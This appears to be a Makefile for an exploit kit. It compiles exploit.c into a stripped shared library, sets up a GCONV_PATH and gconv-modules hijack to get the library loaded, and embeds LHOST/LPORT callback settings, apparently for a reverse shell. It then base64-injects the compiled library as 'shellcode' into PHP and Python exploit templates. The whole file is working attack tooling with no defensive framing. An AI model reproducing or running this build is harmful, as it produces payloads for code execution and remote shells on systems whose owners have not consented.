SHELL = /bin/bash
ARCH = $(shell uname -m)

SRCS = exploit.c
EXPLOITS = exploit.php exploit.py

SO_NAME = exploit
SO_DIR  = $(SO_NAME)
SO_PATH = $(SO_DIR)/$(SO_NAME).so
SO_LOADER = $(shell readelf -p.interp $(shell command -v $(MAKE)) | grep -o '/.*.so.*')

GCONV_DIR = GCONV_PATH=.
GCONV_MOD_PATH = $(SO_DIR)/gconv-modules
GCONV_MOD_CONTENT = module UTF-8// $(SO_NAME)// $(SO_NAME) 2

LHOST = 127.0.0.1
LPORT = 8000

CC = gcc
CFLAGS  = -fPIC -Wall -Wextra -O2 \
	  -DSO_NAME='"$(SO_NAME)"' -DSO_LOADER='"$(SO_LOADER)"' \
	  -DLHOST='"$(LHOST)"' -DLPORT='"$(LPORT)"'
LDFLAGS = -shared -Wl,--entry=so_main


all: $(SO_NAME).so strip $(EXPLOITS)

$(SO_NAME).so: $(SO_NAME).o
	$(CC) -o $@ $^ $(LDFLAGS)

$(SO_NAME).o: $(SRCS)
	$(CC) -o $@ -c $< $(CFLAGS)

strip: $(SO_NAME).so
	strip --strip-unneeded $<

$(EXPLOITS): $(EXPLOITS:=.in)
	@echo 'make "$(ARCH)_$@"'
	@sed \
	    -e "s|@SO_NAME@|$(SO_NAME)|g" \
	    -e "s|@SO_DIR@|$(SO_DIR)|g" \
	    -e "s|@SO_PATH@|$(SO_PATH)|g" \
	    -e "s|@GCONV_DIR@|$(GCONV_DIR)|g" \
	    -e "s|@GCONV_MOD_PATH@|$(GCONV_MOD_PATH)|g" \
	    -e "s|@GCONV_MOD_CONTENT@|$(GCONV_MOD_CONTENT)|g" \
	    -e "s|@SHELLCODE@|$(shell base64 $(SO_NAME).so -w 0)|g" \
	    $@.in > $(ARCH)_$@

clean:
	@rm -vrf *.{o,so,php,py} GCONV_PATH=. $(SO_NAME)
.PHONY: clean
